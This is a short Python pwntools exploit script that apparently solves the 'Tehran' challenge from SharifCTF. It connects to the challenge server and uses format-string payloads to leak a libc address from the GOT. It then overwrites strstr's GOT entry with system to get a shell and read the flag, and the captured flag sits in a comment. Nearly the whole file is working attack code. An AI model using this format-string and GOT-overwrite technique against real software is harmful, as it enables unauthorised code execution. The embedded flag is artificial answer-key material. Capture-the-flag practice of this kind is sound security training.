#!/usr/bin/python

from pwn import *

"""
$ cat /home/rooney/suctf/Tehran/flag
SharifCTF{ed22e592957fbae123d1bd45e0677b52}
"""

r = remote("ctf.sharif.edu", 54515)
#r = process("./tehran")
e = ELF("./libc.so.6")
#e = ELF("/lib/i386-linux-gnu/libc-2.19.so")
raw_input("$ ")
strstr_got = 0x804c104

#puts("%2052x%1$hn%44930x%2$hn", 0x0804C006, 0x0804C004);  # fini_array (not needed)

# mprotect_got -> main 
first = """
begin()
{
puts("%2052x%1$hn%44930x%2$hn", 0x804c10a, 0x804c108);  
puts("AAAA%sZZZZ", 0x804c104); 
fillout();
}
EOF
"""
r.sendline(first)
r.recvuntil("AAAA")
strstr_got = u32(r.recvuntil("ZZZZ")[:4])
print "strstr_got", hex(strstr_got)
libc_base = strstr_got - e.symbols["strstr"]
print "libc_base", hex(libc_base)

system = libc_base + e.symbols["system"] + 0x290
#system = libc_base + e.symbols["system"]
print "system", hex(system)
second = """
begin()
{
"""

second += "puts(\"%{}x%1$hn%{}x%2$hn\", 0x804c104, 0x804c106); ".format(system & 0xffff, ((system >> 16) & 0xffff) - (system & 0xffff))

second += """
fillout();
}
EOF
"""
#print second

r.sendline(second)
r.sendline("/bin/sh;")
r.sendline("cat /home/rooney/suctf/Tehran/flag")
#r.interactive()
r.recvuntil("SharifCTF")
print "flag: SharifCTF" + r.recvuntil("}")
r.close()
